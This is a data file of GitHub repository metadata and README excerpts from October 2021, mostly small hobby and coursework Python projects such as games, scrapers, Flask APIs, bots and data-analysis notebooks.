417146263;FLPInspect;https://github.com/demberto/FLPInspect;Python;2021-10-14T13:43:03Z;0;0;0;FLPInspect  A GUI tool to inspect and modify an FLP.  FLPInspect, is a GUI tool to inspect the internal event structure which is abstracted by PyFLP. You can read and edit FLP files.  Installation FLPInspect require Python 3.6+   Via pip [Recommended]: pip install --upgrade flpinspect    OR, via releases  Install required dependencies: pip install -rrequirements.txt      Note for Mac users Although FLPInspect is cross-platform, Tkinter has some issues with Mac, I don't have a Mac to test myself. The bugs will only be minor UI bugs at most. Documentation Project Goals & Issues License FLPInspect is licensed under the GNU Public License v3 
417151688;pt-stampindo-lancar-jaya;https://github.com/kenedinovriansyah/pt-stampindo-lancar-jaya;TypeScript;2021-10-14T13:58:27Z;0;0;0;How to use npm install python -m pip install -r requirements.txt for running npx ts-node wather/wather.ts python wather/wather.py php wather/wather.php  python range/range.py npx ts-node range/range_1_100.ts php range/range_1_100.php  Output range  typescript    python    php   Output wather  typescript    python    php   
417055705;kata_ialib;https://github.com/losedavidpb/kata_ialib;Python;2021-10-14T08:47:39Z;0;0;0;
417173555;Stock-Info;https://github.com/python128/Stock-Info;Python;2021-10-14T14:58:41Z;0;0;0;"Stock-Info A simple terminal app that gives you LIVE stock prices and advices you to buy, sell or keep your stocks based on the data given.  Installation  Clone the git repository in your preferred directory. As simple as that!  Configuration For this app to work, you need to provide a few details in src/data.csv. Format: (of configuration) ""symbol"",bp,sp # Ticker Symbol, Buy Price, Sell Price - DON'T EDIT THIS LINE ""HDFC"",5000,10000 # Example   Where:  Ticker Symbol is the Symbol of the stock [Eg: for ICICI bank, the symbol is ICICIBANK]. Buy Price(BP) is the price at which you would like to buy the stock. Sell Price(SP) is the price at which you would like to sell the stock.  Leave no spaces after the commas in data.csv Requirements  Python 3.7+ Certain modules  Running After the configuration, we can run Stock-Info by running the following in src: python main.py OR python3 main.py It will give you a result such as this:  Miscellaneous  If you don't give any data, it will give an error. If you give wrong data(ticker symbol is not correct), it will give an error.  If you find any Issue or have a Feature Request, please open an issue. If you have an idea for a feature, please open a PR. PLEASE USE AT YOUR OWN RISK "
417088477;working_software_now;https://github.com/ApiLogicServer/working_software_now;Dockerfile;2021-10-14T10:36:25Z;1;1;0;Welcome to API Logic Server You are currently in an empty project, pre-configured for the ApiLogicServer Docker container (note the .devcontainer and Dockerfile).   Create To create your project:  Open a terminal window Enter the following command:  ApiLogicServer create --project_name=.  # include the period - it designates the current directory  You will then be asked to supply the db_url  Press RETURN to use the sample project  The project will be created in your current directory (e.g, working_software_now). Using your own database After you have explored the sample, try it with your own database by specifying an appropriate db_url.   For examples, enter the Terminal command: ApiLogicServer examples    Run To run your project, use the created launch configurations to start the API or the Basic Web App.  If you are using your own database, you will need to configure the Web App.     Overview ApiLogicServer creates database api projects:   Created projects are instantly executable, providing a database API and a web app   Customize the projects in an IDE such as VS Code  In particular, use VS Code to create logic using spreadsheet-like rules    Created projects utilize Python from the container, eliminating the need to install Python    
417177745;hotel-crawler;https://github.com/hotel-se/hotel-crawler;;2021-10-14T15:09:25Z;0;0;0;hotel-crawler Crawler for the Hotel Search Engine project 
417173742;Turtle;https://github.com/Pritish934/Turtle;Python;2021-10-14T14:59:13Z;0;0;0;
417101805;InterestingMoviesDB;https://github.com/JoelNithishKumar/InterestingMoviesDB;Python;2021-10-14T11:23:00Z;0;0;0;InterestingMoviesDB List of interesting movies database with names of the Director, Actor, Actress and the year of release created with Python and SQlite. Database Table  
417182896;Presensi-Moodle-Elearning;https://github.com/dendifz/Presensi-Moodle-Elearning;Python;2021-10-14T15:23:59Z;0;0;1;Perkenalan Bot ini dibuat semata mata untuk latihan pembelajaran python, Untuk memudahkan absensi secara otomatis. Kostumisasi Untuk Men-Setup dan Mengkontumisasi Jadwal Bisa Di Buka Di Script presensi.py Kemudian Ubah DISCORD_URL dan NIM & PASSWORD pada kode tersebut. Untuk Mengubah Jadwal dan Link Bisa Menggunakan DB Browser For Sqlite pada Database timtable.db Setup Heroku & Github Untuk Setup & Tutorial Bisa Dilihat di File SS SETUP.pdf 
417161455;pandas-for-EDA;https://github.com/binamify/pandas-for-EDA;;2021-10-14T14:25:37Z;0;0;0;
417121832;xmpp_lis;https://github.com/nishishailesh/xmpp_lis;Python;2021-10-14T12:29:30Z;0;0;0;xmpp_lis Python script to read a database and send mesages via XMPP protocol 
417072368;Youutube-Video-Downloader;https://github.com/Ganesh-Vaishnav/Youutube-Video-Downloader;Python;2021-10-14T09:40:13Z;0;0;0;
417149070;Software-Version-Checker;https://github.com/LucEast/Software-Version-Checker;Python;2021-10-14T13:51:10Z;0;0;0;Software Version Checker A Python Script that crawls given URL's to look after Software-Updates.   Supported tools  7zip ALEAPP Arsenal Image Mounter Atola TaskForce Autopsy AVML AXIOM Belkasoft Evidence Center BlackLight CAINE CyberChef DEFT ElcomSoft iOS Forensic Toolkit EnCase ExifTool Eric Zimmerman's Forensic Tools Forensic Email Collector Forensic Explorer Forensic Falcon Neo F-Response FTK FTK Imager hashcat HstEx iLEAPP IREC iVe Kali KAPE LiME MacQuisition MobilEdit Mount Image Pro MySQL Connector ODBC NetAnalysis NirSoft Launcher NSRL hash list OSForensics Oxygen Forensic Detective Paraben E3 Passware Physical Analyzer The Sleuth Kit TZWorks UFED 4PC USB Detective VeraCrypt XAMN X-Ways  If your favorite tool is missing, feel free to open an Issue and provide me with a link to that tool's website. Dependencies You can install the dependencies with: pip3 install -r requirements.txt  or individually with: pip3 install tabulate pip3 install grequests pip3 install beautifulsoup4 pip3 install tkScrolledFrame   
417174920;flask-project_game-of-life;https://github.com/AnastasyIanacov/flask-project_game-of-life;;2021-10-14T15:02:06Z;0;0;0;
417160365;CreateTimeTableForSportsCompetition;https://github.com/NITNCtanakaShoki/CreateTimeTableForSportsCompetition;;2021-10-14T14:22:50Z;0;0;0;CreateTimeTableForSportsCompetition スポーツ大会のタイムテーブルを作成するPythonスクリプト 
417166500;py-math;https://github.com/jiemingyou/py-math;;2021-10-14T14:39:24Z;0;0;0;py-math Numerical differential and matrix calculations implemented in python 
417166889;hungmen;https://github.com/protocypher/hungmen;Python;2021-10-14T14:40:23Z;0;0;0;
417187322;google_it_automation_coursera;https://github.com/SibyP/google_it_automation_coursera;;2021-10-14T15:37:14Z;0;0;0;google_it_automation_coursera This repository contains scripts I had to code during the course Google IT Automation with Python. 
417054842;downtidy;https://github.com/sfondev/downtidy;Python;2021-10-14T08:45:02Z;0;0;0;"downtidy  Just a stupid Python script to sort my downloads folder based on file extensions. Tried to use only the Python standard library. OBS:It should work, but it needs more testing (Not responsible for any files lost to the void 😅). black formatter settings: default TODO + Comment the code properly + Maybe add reading config from JSON or similar + Maybe add progress bars (probably unnecessary and will add dependencies (""--progress""? check if tqdm is already installed?)) + Maybe add color to the error ""log"" messages and to the exceptions strings (ANSI Escape codes?) + Fix bugs and improve performance where needed (Python+I/O are slow,so probably can only optimize memory used, stupidly made for loops or hashing time by just hashing a fixed number of blocks (might cause collisions)) + Change paths from strings to Path types/class (is it better? :thonk:) + Maybe add ""--folder"" argument that allows the folder path given to be used as target to be tidied + Maybe add ""--dry-run"" or ""--dry"" to simulate running the script on the downloads folder (or in the folder given to ""--folder"" if I end up implementing that) + Maybe add different ""--log-level"" that allows to choose from completely silent,log to stdout(default), log to a file in the root of the folder to be tied (add exception for this file not to be tidied) + Maybe add total time taken to the log + Maybe reimplement in a faster language(like C++ or Rust) or in other scripting language (like Bash or POSIX shell), once I learn them properly (like I even know Python properly :LUL:)    "
417162899;WSI;https://github.com/BartlomiejRasztabiga/WSI;Python;2021-10-14T14:29:36Z;0;0;0;
417107475;Series_Temporais_Aleatorias_Normalizadas;https://github.com/Marcus-V-Freitas/Series_Temporais_Aleatorias_Normalizadas;Jupyter Notebook;2021-10-14T11:43:02Z;0;0;0;
417070203;Fetch_Twitter_Data;https://github.com/Sarveshgupta20/Fetch_Twitter_Data;Python;2021-10-14T09:33:05Z;0;0;0;Fetch_Twitter_Data Fetch Tweets from Twitter Using Twitter API and Tweepy Python Module. 
417132611;FakeNewsDetection;https://github.com/singh-hemant/FakeNewsDetection;Jupyter Notebook;2021-10-14T13:02:47Z;0;0;0;
417101996;Telegram-PhotoshopBattles-Bot;https://github.com/Shakkak/Telegram-PhotoshopBattles-Bot;Python;2021-10-14T11:23:41Z;0;0;0;Telegram-PhotoshopBattles-Bot A simpler way to enjoy PhotoshopBattles Subreddit with the help of praw and python-telegram-bot. you can test it on @PSB_UploaderBot. 
417143073;multi_exec;https://github.com/hvvit/multi_exec;Python;2021-10-14T13:33:43Z;0;0;0;"multi_exec Python code to run command on multiple hosts using pssh library To install requirements pip3 install -r requirements.txt  To trigger cli environment python3 main.py  sample cli output Enter comma seperated hosts example (username@host1,username@host2): ubuntu@10.113.121.129,ubuntu@10.113.121.50 Enter command to execute: cat /etc/hostname executing command:  10.113.121.129 -------------------------------------------------------------------> execution completed 10.113.121.50 -------------------------------------------------------------------> execution completed print output for (y/n): y 10.113.121.129 -------------------------------------------------------------------> execution completed 10.113.121.129 :: new-machine1 10.113.121.50 -------------------------------------------------------------------> execution completed 10.113.121.50 :: new-machine2 Press (y/n) to start again : y Enter comma seperated hosts example (username@host1,username@host2): ubuntu@10.113.121.129,ubuntu@10.113.121.50 Enter command to execute: cat /etc/lsb-release executing command:  10.113.121.129 -------------------------------------------------------------------> execution completed 10.113.121.50 -------------------------------------------------------------------> execution completed print output for (y/n): y 10.113.121.129 -------------------------------------------------------------------> execution completed 10.113.121.129 :: DISTRIB_ID=Ubuntu 10.113.121.129 :: DISTRIB_RELEASE=20.04 10.113.121.129 :: DISTRIB_CODENAME=focal 10.113.121.129 :: DISTRIB_DESCRIPTION=""Ubuntu 20.04.3 LTS"" 10.113.121.50 -------------------------------------------------------------------> execution completed 10.113.121.50 :: DISTRIB_ID=Ubuntu 10.113.121.50 :: DISTRIB_RELEASE=20.04 10.113.121.50 :: DISTRIB_CODENAME=focal 10.113.121.50 :: DISTRIB_DESCRIPTION=""Ubuntu 20.04.3 LTS"" Press (y/n) to start again : n  "
417111908;processing-sketches;https://github.com/mrcordiner/processing-sketches;JavaScript;2021-10-14T11:57:50Z;0;0;0;Processing Sketches A collection of sketches exploring Processing, Python, webdev and design. Permutation City - interactive sketch based on the grid design of the book by Greg Egan. 
417102013;udemy-drf-essencial;https://github.com/athenas2021/udemy-drf-essencial;Python;2021-10-14T11:23:43Z;0;0;0;udemy-drf-essencial Udemy - Crie APIs REST com Python e Django REST Framework: Essencial 
417120498;Lhy-ML2021-HW;https://github.com/turlydark/Lhy-ML2021-HW;Python;2021-10-14T12:25:24Z;0;0;0;Lhy-ML2021-HW 李宏毅2021春机器学习的课程作业 python版 参数设置在config文件中，model在classifier文件中 目前为baseline版本 
417171387;CRUD-Flask-SQLAlchemy;https://github.com/feilonn/CRUD-Flask-SQLAlchemy;Python;2021-10-14T14:52:47Z;1;1;0;
417113681;Learn-how-to-Web-Scrape;https://github.com/Mimansa-sudo/Learn-how-to-Web-Scrape;;2021-10-14T12:03:35Z;0;0;0;Learn-how-to-Web-Scrape This program focuses on scraping a website with the help of Python. Contributors Arjama Pal Kunal Singh Patel Saransh Yadav 
417178367;game-of-life_flask-project;https://github.com/AnastasyIanacov/game-of-life_flask-project;;2021-10-14T15:11:07Z;0;0;0;game-of-life_flask-project This is a project. I created a mini game using python flask for stepik course 
417141353;parallel_IO_testprog;https://github.com/manuelseet/parallel_IO_testprog;;2021-10-14T13:28:37Z;0;0;0;parallel_IO_testprog Python test programme (psychopy) to test I/O via parallel port for TMS triggers [May 2017]. This Psychopy programme was developed to test the precision and synchrony of the Parallel Port component for use by an external transcranial magnetic stimulation system that delivers time-controlled ON-only triggers, as well as a third-party data acquisition hardware (PowerLab). Tested parameters include:  stimulus onset asychrony (SOA) between a screen cue on the host computer and an Parallel Port event presence and absence of a trigger to the TMS event in the event  The data acquisition device is also calibrated, and should have an onset SOA = -0.05 relative to the main TMS trigger. Offset SOA = 0.30 relative to onset 
417107045;CalculatorPy;https://github.com/Swapnil-11-04-01/CalculatorPy;TeX;2021-10-14T11:41:27Z;0;0;0;
417141549;VLC-media-controller-Using-hand-Gesture-;https://github.com/anikesh2/VLC-media-controller-Using-hand-Gesture-;Python;2021-10-14T13:29:14Z;0;0;0;VLC Media PLayer Controller Using Hand Gestures I have used mediapipe Python library to recognize hand from camera and other framework like numpy, openCv, pycaw etc. The cv2 module will allow us to obtain the frames from the camera, over which we will perform the hand landmarks estimation by using the functionality exposed by the mediapipe module.  To install the required python framework, simply copy-paste the following command in command prompt   (Open CMD in same file where requirements.txt is located) pip install -r requirements.txt  We can control VLC media Player Functionally like Pause, Play, Fast-forward, backward, mute, Umute and we have added different gesture for different function  NOTE: THE VLC MEDIA PLAYER SHOULD ALREADY INSTALL ON THE DEVICE. Gesture to control different function    mute / unmute pause / play               Backwards 10 sec Forward 10 sec               Volume up / down           
417139627;PSPGradient-reader-and-writer;https://github.com/LeviFiction/PSPGradient-reader-and-writer;;2021-10-14T13:23:29Z;0;0;0;PSPGradient-reader-and-writer This is some utility code for reading and writing PSPGradient files in Python Gradient_Reader class provides an interface for reading the color stops into a PSP color dict. Gradient_Writer allows you to create a gradient adding color and transparency stops and saving the result to a PSPGradient file.  The PSPScript file contains both classes as well as a demonstration of using both. 
417051082;Wallet_Alerter;https://github.com/JackECivre/Wallet_Alerter;Python;2021-10-14T08:32:04Z;0;0;0;
417158482;recon-task;https://github.com/naufalan/recon-task;;2021-10-14T14:17:39Z;0;0;0;Recon-Tasks  Python tools that automate initial recon task during CTF or Penetration Testing  Currently under development 
417099576;TEMPERATURE-AND-HUMIDITY-FORECASTING;https://github.com/AmanMadhok/TEMPERATURE-AND-HUMIDITY-FORECASTING;Python;2021-10-14T11:15:19Z;1;1;0;TEMPERATURE-AND-HUMIDITY-FORECASTING Find current and upcoming weather of a city using OpenWeatherMap API and Matplotlib in Python. 
417079400;PlaylistDownloader;https://github.com/haker88/PlaylistDownloader;Python;2021-10-14T10:03:55Z;1;1;0;
417044716;Virtual-Assistance;https://github.com/Adarsh-Raj-Jaiswal/Virtual-Assistance;Python;2021-10-14T08:12:22Z;0;0;1;
417081433;rock_paper_scissors_repo;https://github.com/Whoisbk/rock_paper_scissors_repo;Python;2021-10-14T10:10:51Z;0;0;0;
417070810;cythonpackage;https://github.com/pprados/cythonpackage;;2021-10-14T09:35:06Z;0;0;0;
417087384;dafact;https://github.com/bramucas/dafact;;2021-10-14T10:32:18Z;0;0;0;dafact Small python library for encoding different data sources as Answer Set Programing facts. 
417159463;Spark;https://github.com/Ivan395/Spark;Jupyter Notebook;2021-10-14T14:20:20Z;0;0;0;
417114954;sinaplot;https://github.com/Magiduck/sinaplot;Python;2021-10-14T12:07:27Z;0;0;0;sinaplot Sinaplot implementation in Python adapted from https://github.com/mparker2/seaborn_sinaplot Adapted to include a boxplot in the middle of the sinaplot. Difference in implementation: showboxplot=True to draw boxplots in the sinaplots. example use: sinaplot(x='allele', y=value, data=df, showboxplot=True, point_size=1, width=0.95, scale='area', color='gray') 
417100761;spectrum_plotter;https://github.com/fusion-energy/spectrum_plotter;Python;2021-10-14T11:19:23Z;0;0;0;spectrum_plotter A Python package for creating standard plots for neutron / photon / particle spectrum 
417126046;GetFilmInfo;https://github.com/marko-zec/GetFilmInfo;Python;2021-10-14T12:42:45Z;1;1;0;
417141124;imageDownloader;https://github.com/Ojooh/imageDownloader;Python;2021-10-14T13:27:51Z;0;0;0;
417107174;Higher-Lower-Game;https://github.com/DARED3ViL90/Higher-Lower-Game;Python;2021-10-14T11:41:51Z;0;0;0;Higher-Lower-Game As the name suggests, it's a higher lower guessing game. Trying to learn Python. 
417131163;Quick-pygame-game;https://github.com/SaarinOsk/Quick-pygame-game;Python;2021-10-14T12:58:43Z;0;0;0;
417134186;data_visualization;https://github.com/EthanWhite134/data_visualization;;2021-10-14T13:07:29Z;0;0;0;
417136985;LinkedList_Data-Structure;https://github.com/drea713/LinkedList_Data-Structure;Jupyter Notebook;2021-10-14T13:15:34Z;0;0;0;
417157863;AUEB-notification_web_scraper;https://github.com/giorgos-athanassopoulos/AUEB-notification_web_scraper;Python;2021-10-14T14:15:49Z;0;0;0;AUEB-notification_web_scraper a web scraping application for getting aueb's notifications made with python-beautifulsoup-requests 
417160751;binary_converter;https://github.com/alberdotpy/binary_converter;;2021-10-14T14:23:53Z;0;0;0;binary_converter A python converter that can translate date from alphanumeric to binary 
417087855;flask_REST_API;https://github.com/Whoisbk/flask_REST_API;Python;2021-10-14T10:34:07Z;0;0;0;
417180266;searchable_PDF;https://github.com/nsyawali12/searchable_PDF;;2021-10-14T15:16:26Z;0;0;0;searchable_PDF Project External for saving some money, creating a searchable_pdf using python with pytesseract :D 
417042567;Hangman-Game;https://github.com/IN0C3NC10/Hangman-Game;Python;2021-10-14T08:05:16Z;0;0;0;" Jogo da Forca 💀    Esta é uma aplicação executável bem básica, desenvolvida com fins de estudo e aprendizado em Python, realiza a apresentação da clássica ""forca"" e a palavra por sua vez, é obtida de forma aleatória a partir da API do Dicionário Aberto (Não se assuste se aparecer alguma palavra maluca). Toda a aplicação é circundada com o ""while"", contando com uma função de redefinição do jogo e também uma responsável pela ""construção"" da forca.       Funcionalidades   Contrutor de Tela (Forca+Jequetibas);  Loop ""While"";  Leve tratamento de variáveis e formatação;  Tecnologias As seguintes ferramentas foram usadas na construção do projeto:  Python  Pré-Requisitos Antes de começar vale lembrar, é necessário possuir o Python instalado em sua máquina. É bacana também você possuir um editor para trabalhar com o código, fica a dica o VSCode. Rodando a aplicação # Clone este repositório $ git clone https://github.com/IN0C3NC10/Hangman-Game.git  # Abra o projeto no seu editor de preferência  # Execute o arquivo main.py no terminal  # Ou, caso queira apenas se divertir um pouco, é só executar o arquivo ""main.py""  #BeHappy! Autor      	Feito com ❤️ por Bruno Inocencio!             "
417055150;File-management-with-AmazonS3;https://github.com/rohanreddymelachervu/File-management-with-AmazonS3;Python;2021-10-14T08:46:01Z;0;0;0;File-management-with-AmazonS3 Python code to connect with an Amazon S3 bucket and upload files with encryption. Signup/login to a file management system, backend-Amazon S3 and MySQL DB The code first splits the file into 3 parts, and then encrypts each file using symmetric encryption and uploads it to Amazon S3 bucket. The user credentials (username and password) and the public key (for encryption and decryption) is saved in a local database. 
417193187;streamlit-project-front-end-for-data-science-project-final---Copy---Copy;https://github.com/saurabd007/streamlit-project-front-end-for-data-science-project-final---Copy---Copy;Python;2021-10-14T15:54:33Z;0;0;0;
417185477;BigPig;https://github.com/BigGoby/BigPig;Python;2021-10-14T15:31:41Z;0;0;0;BigPig 将你的Python代码发布并让别人 pip install安装使用 
417171547;ats-resume-generator;https://github.com/louisgregg/ats-resume-generator;Python;2021-10-14T14:53:13Z;0;0;0;ATS Resume Generator Large companies parsae and sort job applicant resumes using Applicant Tracking Systems (ATS). Most applicants will submit word documents or PDFs generated from a word document. Therefore most ATS software will be tuned to parse .docx files. If a resume is generated by other software (e.g. LaTeX), then it may be parsed incorrectly by ATS software and the application rejected. ... Why write your resume in Word when you can write a scipt to do it for you? Installation You can install this script by doing something like: git clone https://github.com/louisgregg/ats-resume-generator.git cd ats-resume-generator python3 -m venv venv && . venv/bin/activate && pip3 install docx docxtpl You should then have all the requirements (docx and docxtpl) installed. Usage Run the script with: python3 resume_generator.py This will generate a document, generated_resume.docx, which should play nicely with the HR departments software. Edit the contents dictionary in the script to add your own name, work history, etc. 
417083156;clean_fastapi;https://github.com/evoludigit/clean_fastapi;Python;2021-10-14T10:17:03Z;0;0;0;"    Clean architecture with FastAPI      A simple todo API built in Python, using clean architecture and DDD     principles.     Table of Contents   About The Project  Built With    Getting Started  Prerequisites Installation   Usage Roadmap Contributing License Contact Acknowledgments   About The Project Domain driven design, while gaining popularity thanks to books such as Architecture Patterns in Python, is not yet so common. This is a project showcasing how to build a FastAPI app with separation of concerns and layered (onion) architecture. Built With  Poetry FastAPI PostgreSQL SQLAlchemy  Dev dependencies:  Pytest-postgresql Travis  (back to top) Getting Started to be completed … Prerequisites  postgresql (optional, for testing only)  Installation  Install PostgreSQL  to be completed… (back to top) Usage to be completed… (back to top) Roadmap  [] Complete README [] Implement database support [] Implement FastAPI support  (back to top) Contributing Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are greatly appreciated. If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag ""enhancement"". Don't forget to give the project a star! Thanks again!  Fork the Project Create your Feature Branch (git checkout -b feature/AmazingFeature) Commit your Changes (git commit -m 'Add some AmazingFeature') Push to the Branch (git push origin feature/AmazingFeature) Open a Pull Request  (back to top) License Distributed under the MIT License. See LICENSE.txt for more information. (back to top) Contact info Lionel Hamayon - www.evolution-digitale.fr Project Link: https://github.com/evoludigit/clean_architecture (back to top) Resources Apart from the DDD classics (red book: Implementing Domain Driven Design, and blue book: Domain Driven Design), these authors have advanced the cause for DDD in Python:  Harry J.W. Percival and Bob Gregory Leonardo Giordani Sebastian Buczyński  "
417071198;LucaSoft-J.O.U.R.N.A.L;https://github.com/Lucaspec72/LucaSoft-J.O.U.R.N.A.L;Python;2021-10-14T09:36:20Z;0;0;0;LucaSoft J.O.U.R.N.A.L The J.O.U.R.N.A.L (Just anOther User Redaction & Navigation Assistant by Lucaspec72) is a Python program that handles the creation, encryption and storage of log/journal files. Kinda works like a diary of sorts. Note: this is a WIP project i've started around october 8 2021. 
417181892;CEF_and_ETF_data;https://github.com/Beliavsky/CEF_and_ETF_data;Python;2021-10-14T15:21:07Z;1;1;0;CEF and ETF data R, Python and Windows CMD scripts to get and format quotes for closed-end funds and exchange-traded funds. Instructions: (1) Install Python 3, R and the R quantmod package. (2) On Windows, run the script cef_times.bat from a CMD terminal. Change the symbols in xget_quotes_cefs.r and xget_quotes_etfs_for_cefs.r as desired. 
417167311;Digital-Signatures-using-ISRSAC-Algorithm;https://github.com/Vasu-Mandhanya/Digital-Signatures-using-ISRSAC-Algorithm;Python;2021-10-14T14:41:28Z;1;1;0;Digital Signatures using ISRSAC Algorithm A simple python program to sign text using either the RSA or ISRSAC algorithm with GUI built using tkinter library.  To Run:  Open the repository folder in Command Prompt / terminal in run the following commands: pip3 install -r requirements.txt  python Sign.py   Screenshots   Generate Keys    Sign Text    Verify Signature    Settings   
417084222;reddit-bots;https://github.com/Dimittrikov/reddit-bots;Python;2021-10-14T10:21:03Z;0;0;0;
417154837;pose-mapper;https://github.com/MathiasBaumgartinger/pose-mapper;Python;2021-10-14T14:07:05Z;0;0;0;"Pose-Mapper A Blender-Python plugin and the required preprocessing for mapping pose-estimated data onto a generic model. The current version uses a model exported from !(Makehuman)[http://www.makehumancommunity.org/] in the Makehuman 2 standard (.mhx). The plugin offers the application of multiple video-sequences one by one onto the same model. For instance motions over the course of a cutscene can be mapped. The scene has to be manually cut in before. Usage The workflow currently includes 4 major steps:  Finding an (appropriate) video-sequence Preprocessing Exporting and loading a model from Makehuman Application on the model  Prerequisites  mediapipe >= 0.8.4.2 opencv >= 4.0.1 MHX2 plugin for blender (http://www.makehumancommunity.org/content/plugins.html)  Step 1: Finding an (appropriate) video-sequence In the current state, finding an appropriate video sequence is quite challenging. There are certain factors that have a major impact on the accuracy of the pose tracker. The main criteria I found to achieve good results are:  Only one person on screen The pose-tracker can only track one person at a time - with multiple persons it will mix them up frequently and thus produce heavy inaccuracies Camera movement Optimally the camera should not move at all, as any movement on the camera will be mapped to the model High resolutions I have noticed that the higher the resolution of the video, the higher the output quality Full shots The more of the body is visible the less has to predicted by magic. Contrast between person and background A high contrast makes finding movement for the predictor a lot easier  Step 2: Preprocessing Preprocessing in the case of this repository describes the process of creating a JSON with positions of landmarks (as described in under https://google.github.io/mediapipe/images/mobile/pose_tracking_full_body_landmarks.png) frame by frame. The preprocessing used here is based on the . Usage: python ./preprocess/mp_pose_preprocess.py <path_to_video> <destination_file> Step 3: Exporting and loading a model from Makehuman Exporting the desired model from Makehuman as .mhx2 file and loading the model into blender using the MHX2 plugin described in the prerequisites (http://www.makehumancommunity.org/content/plugins.html). A generic model from Makehuman is inside the directory models/standard.mhx2. The application can be applied on any model of the .mhx2 standard, just make sure to assign the name of the model inside of blender to MODEL_NAME.  Step 4a: Application on the model With a correct setup, from here one just needs to open the pose-application.py in blender, tune the constants accordingly (more information under Configuration) and run the script. The results can be best obtained in the ""Animation"" tab of Blender.  Step 4b: Visualizing with ""plain.py"" Another visualization of the data is provided by means of the plain-object. With it only the landmarks are being depicted according to the pose-estimator inside of blender without a matching model. Step 4a and 3 are not necessary for this visualization. I recommend not to use a plain and a model inside the same blender execution as it causes bugs.  Configuration pose_application  PATH_PREFIX  importlib.util sadly did not work with relative paths for me so you have to define the root to the location of this git repo on your local machine E.g.: ""C:/sem2/P1/implementations/pose-estimation/""   MODEL_NAME  The model name as depicted in Blender in the scene-collection   DATA_PATHS  Give the path to any number of preprocessed jsons in here. A new json will be handled as ""cut"". E.g.: [PATH_PREFIX + ""preprocess/output/walking.json"", PATH_PREFIX + ""preprocess/output/sit_down_fixed.json""]   DISTANCE_FACTOR  How much the location of the screen space (0-1) of model in the pose estimator is being multiplied with   AVG_OVER_N_FRAMES  How many frames should be averaged (applying each estimated frame makes it very jittery)   FRAMES_BETWEEN  How many keyframes blender should put between the i-th video   CONNECTIONS  How the PoseBones in Blender should be connected, it might be necessary to change this if one uses another estimator/model, otherwise i suggest leaving this the way it is    preprocess  BODY_PARTS  Defines which way to name the bones identified by 0 to 32 from https://google.github.io/mediapipe/images/mobile/pose_tracking_full_body_landmarks.png. It should match the CONNECTIONS from the pose-application as well as the model's according bones    Limitations  Jittering: As of now the mapping is very jittery. Increasing AVG_OVER_N_FRAMES makes this better, leads to other bugs in some cases however. No ""real-life"" body constraints: Sometimes body-parts are overlapping/pointing in directions which are actually not possible Only one person: As mentioned before only one person can be tracked Camera perspectives: Camera perspectives might distort the way the pose-estimator estimates the coordinates Camera movement: Camera movement appears as model movement in the end, the model would need to be focussed in the middle Translation calculated hard-coded: The translation is as of now hardcoded with DISTANCE_FACTOR Cuts have to be marked manually: If the video has a cutscene, the scene must be manually cut and then individually preprocessed Only arms and legs: Only arms and legs are being tracked at the moment. It would be further possible to track fingers/head/etc..  Credits The preprocessing script was heavily influenced by https://www.youtube.com/watch?v=brwgBf6VB0I&t=750s. All this is based on the mighty work of mediapipe's pose-estimator. Kudos to the Makehuman community! "
417190353;Unsupervised-Discovery-of-Mid-Level-Discriminative-Patches;https://github.com/bscwty/Unsupervised-Discovery-of-Mid-Level-Discriminative-Patches;Python;2021-10-14T15:46:06Z;0;0;0;Unsupervised-Discovery-of-Mid-Level-Discriminative-Patches A non-official python implementation of paper  《Unsupervised Discovery of Mid-Level Discriminative Patches》 by Singh S et al. modifications  change the original hog discriptor to CNN feature extractor use the office-31/officehome as datasets and the real-world samples are still in the same dataset  
417141870;FTP;https://github.com/zyxcathy119/FTP;;2021-10-14T13:30:05Z;0;0;0;FTP FTP文件传输，C语言服务器和python图形界面客户端 
417089156;PongPy;https://github.com/Swapnil-11-04-01/PongPy;TeX;2021-10-14T10:38:49Z;0;0;0;
417168895;CE4042-Neural-Networks-and-Deep-Learning;https://github.com/aish21/CE4042-Neural-Networks-and-Deep-Learning;Jupyter Notebook;2021-10-14T14:45:53Z;0;0;0;
417185299;anti-hate-reddit-bot-with-PRAW-and-BERT;https://github.com/AindriyaBarua/anti-hate-reddit-bot-with-PRAW-and-BERT;Python;2021-10-14T15:31:13Z;1;1;0;anti-hate-reddit-bot-with-PRAW-and-BERT This is a reddit bot that detects hate speech in hindi-english code mixed comments in a subreddit, and warns the user posting hate speech. The detection is done with distil-bert model built on hindi-english code mixed dataset of 12433 annotated sentences. Detailed blog on the project: https://medium.com/@barua.aindriya/reddit-bot-to-fight-hindi-english-code-mixed-hate-speech-with-bert-214624392c3a Demo: https://www.reddit.com/r/nlptestsubreddit/comments/q95m15/india_itna_intolerant_ho_raha_hai_din_bar_din/ Functionality:  
417102965;workout-tracking;https://github.com/IliasMariosG/workout-tracking;Python;2021-10-14T11:26:51Z;0;0;0;"Workout Tracking Project Build an exercise tracking application using Python and Google sheets. The inspiration comes from the Open AI GPT-3 AI model, a natural language processing model. Write down the exercises that you did in a plain English sentence. Tools A spreadsheet Nutrionix API website:   Sign up for a free plan to get your API Key   Sign in to see the API key and App id   Help for solving each step Nutritionix ""Natural Language for Exercise"" API Documentation To authenticate your request To make the POST request with the required parameters Use example Running the programme: $ python3 main.py What did you do today? (Waiting for your answer)  Typing your answer: What did you do today? Played volleyball for 1 hour  Check your sheet:   "
417085491;falconSwing;https://github.com/jcaruana09/falconSwing;;2021-10-14T10:25:25Z;0;0;0;falconSwing A REST API for golf products using the python falcon package. It will contain routes to index, show, update, create and delete items from the API 
417068868;Script-Get-Images-Folder;https://github.com/TeivaScouarnec/Script-Get-Images-Folder;Python;2021-10-14T09:28:56Z;0;0;0;Script-Get-Images-Folder A little script in Python for get images in a folder and create a file text who write a balise for integred in file html 
417132789;PWD-Course-MidtermProject;https://github.com/wesleypersad/PWD-Course-MidtermProject;Jupyter Notebook;2021-10-14T13:03:18Z;0;0;0;PWD-Course-MidtermProject This is the midterm project for my Programming with Data  course on the BSc(Hons) Computer Science degree at goldsmiths. Consists of a Jupyter notebook containing Python. The aim of this projects is to pereform sentiment analysis on the song lyrics of the great Progressive Rock Band Rush between 1994 and 2014. 
417177645;Flash-Card-App;https://github.com/mitulsingh01/Flash-Card-App;Python;2021-10-14T15:09:10Z;0;0;0;Flash-Card-App Made this using Tkinter Library in Python and learnt about handling Exceptions and Errors and learned to work with json file. 
